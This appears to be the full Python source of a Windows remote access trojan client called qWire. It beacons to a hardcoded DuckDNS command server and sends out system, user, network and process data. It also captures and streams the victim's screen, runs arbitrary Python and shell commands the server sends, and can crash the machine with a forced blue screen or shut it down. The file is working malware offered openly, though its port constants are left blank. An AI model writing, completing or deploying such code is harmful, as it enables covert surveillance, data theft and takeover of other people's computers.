#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------

import socket
import base64
import ctypes
import platform
import os
import subprocess
import threading
import struct

from PIL import ImageGrab
from time import sleep
from cryptography.fernet import Fernet

SEP = '<sep>' #Create static seperator string
BUFFER = 4096 #Create static buffer int
SERV_PORT = #Create static server port for agent to receive commands
EXFIL_PORT = #Create static port for agent to exfiltrate data to server
STRM_PORT = #Create static port for agent to send frames

CURRENT_DIR = f"{os.getcwd()}\\{os.path.basename(__file__)}" #Get full filepath of current process

class MultiProcessor:
    #Function will start a child thread with no argument to the target function
    def start_child_thread(self,function):
        process = threading.Thread(target=function)
        process.daemon = True
        process.start()

    #Function will create target thread for function that taks one argurment
    def start_child_thread_arg(self,function,arg):
        arg = [arg]
        process = threading.Thread(target=function,args=arg)
        process.daemon = True
        process.start()

class Utilitys:
    #Function will return windows version with a powershell command
    def get_windows_version(self):
        command = subprocess.Popen(['powershell', '(Get-WmiObject -class Win32_OperatingSystem).Version'],stdout=subprocess.PIPE) #Run powershell command and pipe output
        version_output = command.stdout.read().decode()  #Read output from powershell command
        version_output = version_output.replace('\n','') #Replace new line with empty string
        return version_output.strip('\r')                #Strip carriage return and return the output

    #Function will return the output of all running process's on the machine
    def get_running_process(self):
        command = subprocess.Popen(['powershell', 'get-process'],stdout=subprocess.PIPE,shell=True) #Run the command
        com_output = command.stdout.read().decode()         #Capture, read and decode output
        return com_output                                   #Return output

    #Function will get computers local ip and return it as string
    def get_local_ip(self):
        local_ip = socket.gethostbyname(socket.gethostname()) #Resolve system name
        print(local_ip)
        return local_ip                                       #Return local ip address

    #Function checks if process is running as admin and returns boolean value with string
    def check_process_privilege(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator"
        else:
            return "User"

    #Function takes a string input and returns it in bytes
    def convert_string_to_bytes(self, string):
        string_to_bytes = str(string).encode()                                      #Take input string and encode it
        return string_to_bytes                                                      #Return string in byte value

    #Function will run systeminfo & ipconfig commands and then return the output
    def extract_sys_ip_info(self):
        system_info = subprocess.Popen('systeminfo', stdout=subprocess.PIPE) #Run the system info command
        sysinfo_output = system_info.stdout.read().decode()                  #Store the output in a variable
        ip_config = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)     #Run ipconfig command
        ip_config_output = ip_config.stdout.read().decode()                  #Store the output in a variable
        extracted_info = f'{sysinfo_output}\n{ip_config_output}'             #Join the two variables
        return extracted_info                                                #Return the output

class SystemManager:

    #Function will crash the computer with a blue screen
    def blue_screen(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6)

    #Function will reboot the computer without a wait time
    def restart_computer(self):
        subprocess.run('shutdown /r /t 0',shell=True)

    #Function will shut down the computer without warning.
    def shutdown_computer(self):
        subprocess.run('shutdown /p')

    #Function will send back a list of running process's to the server
    def extract_process_list(self):
        process_list = Utilitys().get_running_process() #Get process's
        ExfilSocket().exfil_socket_send(process_list)   #Send to server

    #Function will kill a task by the pid passed as parameter and send the output to the server
    def kill_task(self,pid):
        command = subprocess.Popen(['taskkill','/pid',str(pid),'/f'],stdout=subprocess.PIPE,shell=True) #attempt to kill process by pid
        output = command.stdout.read().decode()                                                    #Parse the output
        ExfilSocket().exfil_socket_send(output)                                                    #Send the output to the server


class Encryption:

    #Function will take string value and encrypt it with the master key and return the encoded value
    def encrypt_packet(self,data_to_encrypt):
        encryption_object = Fernet(MASTER_KEY)                      #create encryption object
        encoded_data = data_to_encrypt.encode()                     #Encode the data as bytes
        encrypted_data = encryption_object.encrypt(encoded_data)    #Encrypt the data
        return encrypted_data                                       #Return the encrypted data

    #Function will take encoded value, decrypt it with the master key and return the plaintext value
    def decrypt_packet(self,data_to_decrypt):
        decryption_object = Fernet(MASTER_KEY)                      #Create decryption object
        decrypted_data = decryption_object.decrypt(data_to_decrypt) #decrypt the encrypted data
        plaintext = decrypted_data.decode()                         #decode the decrypted data
        return plaintext                                            #return the plaintext value of the data

class ClientSocket:
    # Keep all strings in an init function for later usage
    def __init__(self):
        self.heartbeat = 'echo'
        self.dns_address = 'manuallolz.duckdns.org'
        self.env_var = 'USERNAME'
        self.python_flag = 'python'
        self.system_command = 'system'
        self.reconnect_to_server = 'reconnect'
        self.ping_server = 'ping'
        self.sys_info_exfil = 'sys_info'
        self.blue_screen = 'bsod'
        self.restart_computer = 'restart'
        self.shutdown_computer = 'shutdown'
        self.screenshot = 'screenshot'
        self.stream_desktop = 'stream_desktop'
        self.disconnect = 'disconnect'
        self.process_manager = 'proc_list'
        self.term_process = 'terminate'

    #Function will connect to server to initiate handshake
    def connect_to_server(self):
        domain = socket.gethostbyname(self.dns_address)                     #Get IP of domain
        self.client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #Create client socket object
        while True:                                                                 #Loop infinitely until client connects
            try:
                print('Connecting')
                self.client_socket.connect((domain,SERV_PORT))                          #Connect to domain on port
                break                                                               #Break loop if connection is successfull
            except socket.error:                                                    #If connection is unnsuccessful.....
                print('Unsuccessful. Reconnecting')
                self.client_socket.close()                                          #Destory socket object
                sleep(10)                                                           #Sleep for 10 seconds
                return self.connect_to_server()                                     #Return function to create new socket and reinitiate the connection
        print('Connection Successful. Continuing')
        return self.initiate_handshake()

    #Function begins the process of creating a secure channel between the client and server
    def initiate_handshake(self):
        system_name = socket.gethostname()                                          #Get the system name
        self.client_socket.send(Utilitys().convert_string_to_bytes(system_name))    #Send the system name to the server
        print(f'sent system name: {system_name}. Waiting for encryption key...')
        return self.negotiate_encryption()

    #Function will get encryption key from server, decode it from base 64 and set the global variable for the master communication key
    def negotiate_encryption(self):
        global MASTER_KEY                                                           #Set master key as global variable
        b64_encoded_key = self.client_socket.recv(BUFFER)                           #Decode b64 encoding
        MASTER_KEY = base64.b64decode(b64_encoded_key)                              #Set master key equal to decoded encryption key
        print(f'Got encryption key {MASTER_KEY}')
        return self.extract_information()

    #Function extracts information from computer and sends it over to the server for further processing
    def extract_information(self):
        local_ip = Utilitys().get_local_ip()                            #Get local ip
        operating_system = f'{platform.system()} {platform.release()}'  #Platform and release 'Windows' and '10' for example
        current_user = os.environ[self.env_var]                           #get the username of the current user
        privilege = Utilitys().check_process_privilege()                #get the current process privilege
        windows_version = Utilitys().get_windows_version()              #get the windows version
        information_array = []                                          #create array and append all info to it
        information_array.append(local_ip)
        information_array.append(operating_system)
        information_array.append(current_user)
        information_array.append(privilege)
        information_array.append(windows_version)
        print(information_array)
        self.client_socket.send(Encryption().encrypt_packet(str(information_array)))    #send array over to server
        return self.complete_handshake()

    #Function completes handshake by starting an echo with the server in a different process. Returns function to get commands from server
    def complete_handshake(self):
        MultiProcessor().start_child_thread(function=self.start_echo)
        return self.main()

    #Function will send echo to server every 60 seconds. If the server doesnt get the echo or client disconnects, server will remove client from gui
    def start_echo(self):
        while True:
            self.client_socket.send(Encryption().encrypt_packet(self.heartbeat)) #Send echo
            sleep(60)

    #Main process loop. Receive command from server
    def main(self):
        while True:                                        #Start infinite loop
            server_command = self.receive_server_command() #Receive decrypted data from server
            server_command = server_command.split(SEP)     #Seperate server command for parsing
            action_flag = server_command[0]                #Get action flag from server
            if action_flag == self.python_flag:            #If the flag is for python execution
                CodeExecution().execute_python_code(server_command[1]) #Execute the code to the right of the seperator
            if action_flag == self.system_command:                      #If the action flag is for a system command
                CodeExecution().execute_system_command(server_command[1])   #Execute the the code via cmd with subprocess
            if action_flag == self.reconnect_to_server:                 #If the action flag is to reconnect,
                self.client_socket.close()                              #Close the current socket
                return self.connect_to_server()                         #Send main thread back to the connect function to reconnect to server
            if action_flag == self.ping_server:                         #If the action flag is a ping from the server
                ExfilSocket().exfil_socket_send(f'{socket.gethostname()} Is Online') #Tell the server that the host is online with the system name
            if action_flag == self.sys_info_exfil:                                   #If the action flag is to exfil system & ip info
                ExfilSocket().exfil_socket_send(f'{Utilitys().extract_sys_ip_info()}')#Create an exfil socket and send the info
            if action_flag == self.blue_screen:                                       #If the action is a bluescreen
                self.client_socket.close()                                            #Close the current socket
                SystemManager().blue_screen()                                         #Call the crash function to blue screen the system
            if action_flag == self.restart_computer:                                  #If the action is to reboot
                SystemManager().restart_computer()                                    #Reboot computer
            if action_flag == self.shutdown_computer:                                 #If the action is to shutdown computer
                SystemManager().shutdown_computer()                                   #Shutdown the computer
            if action_flag == self.stream_desktop:
                MultiProcessor().start_child_thread_arg(StreamSocket().stream_desktop,arg=False)
            if action_flag == self.screenshot:                                        #If the action is screenshot
                StreamSocket().stream_desktop(screenshot=True)                        #Send a screenshot
            if action_flag == self.disconnect:                                        #If the action is to disconnect
                exit()                                                                #Exit program
            if action_flag == self.process_manager:                                   #If the action is to get the process's running on the machine
                SystemManager().extract_process_list()                                #Send process's to server
            if action_flag == self.term_process:                                      #if the action is to kill a process
                SystemManager().kill_task(server_command[1])                          #kill the task by pid received from server

    #Function will retrieve all data sent by server socket
    def recv_all_data(self):
        bytes_data = b''                                    #Create empty byte string
        while True:                                         #Create infinite loop
            partial_data = self.client_socket.recv(BUFFER)  #Receive encrypted data from server
            bytes_data += partial_data                      #Add each itteration to empty byte string
            if len(partial_data) < int(BUFFER):             #If the length of the partial string is less than the buffer size
                break                                       #Data transmission is complete. Break the loop
        return bytes_data                                   #Return byte data string sent from server

    #Funtion will get data from the server and return it as plaintext. If the server disconnects, the client will attempt
    #To connect back
    def receive_server_command(self):
        print('Getting command from server')
        data = self.recv_all_data()             #Receive entire string of data in bytes
        if not data:                            #If the agent does not receive data/server disconnects
            return self.connect_to_server()     #Reconnect to the server
        plain_text_data = Encryption().decrypt_packet(data) #Decrypt byte string to plaintext
        return plain_text_data                              #Return Plaintext data

    #Function will send data back to server
    def send_data_to_server(self,data):
        data_to_send = Encryption().encrypt_packet(data)          #Encrypt the data
        self.client_socket.send(data_to_send)                     #Send data to server

class ExfilSocket:

    #Function will create socket, connect to server, deliver data and destroy the socket
    def exfil_socket_send(self, exfil_data):
        domain = socket.gethostbyname(ClientSocket().dns_address)           #Resolve domain to ip address
        exfil_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)     #Create exfil socket
        exfil_socket.connect((domain,EXFIL_PORT))                           #Connect to server
        encrypted_data = Encryption().encrypt_packet(exfil_data)            #Encrypt the data
        exfil_socket.sendall(encrypted_data)                                #Send the encrypted data to the server
        exfil_socket.close()                                                #Close and destroy the socket

class StreamSocket:

    def __init__(self):
        self.image_file_path = str(f'{os.getenv("userprofile")}\\AppData\\Local\\Temp\\c.jpg')
        self.dns_address = 'manuallolz.duckdns.org'

    #Function will take a screenshot, save, read and return the data
    def take_screenshot(self):
        screen_cap = ImageGrab.grab()                           #Take screenshot
        screen_cap.save(self.image_file_path, 'jpeg')           #Save the file
        with open(self.image_file_path, 'rb') as image_file:    #Open the image
            image_data = image_file.read()                      #Read the data
            image_file.close()                                  #Close the file
        return image_data                                       #Return the data

    #Function will take single or multiple screenshots depending on boolean parameter
    def stream_desktop(self,screenshot):
        StreamSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         #Create socket
        ip_address = socket.gethostbyname(self.dns_address)                     #Resolve dns
        StreamSocket.connect((ip_address,STRM_PORT))                            #connect to ip and streaming port
        if not screenshot:                                                      #If screenshot is false
            while True:                                                         #Start loop
                image_data = self.take_screenshot()                             #Take screenshot
                StreamSocket.sendall(struct.pack(">Q", len(image_data)))        #Send struct len
                StreamSocket.sendall(image_data)                                #Send the image data
        elif screenshot:                                                        #If screenshot is true
            image_data = self.take_screenshot()                                 #Take screenshot
            StreamSocket.sendall(struct.pack(">Q", len(image_data)))            #send struct len
            StreamSocket.sendall(image_data)                                    #send struct
        StreamSocket.close()                                                    #close socket


class CodeExecution():

    #Function will execute code given as parameter with the python interpreter
    def execute_python_code(self,python_code):
        def exec_(python_code):                 #Create local exec function
            try:
                exec(str(python_code)) #Execute code
            except Exception as error:          #If there's an error
                pass
        MultiProcessor().start_child_thread_arg(exec_,python_code)  #Start thread with code execution, main thread will continue communicating with server.

    #Function will execute system commands with subprocess module
    def execute_system_command(self,system_command):
        def exec_(system_command):                      #Create local exec function
            try:
                subprocess.run(system_command,shell=True)#Execute code
            except Exception as error:                   #If there's an error
                pass
        MultiProcessor().start_child_thread_arg(exec_,system_command) #Start new thread for shell commands. Main thread will continue to communicate with server

ClientSocket().connect_to_server()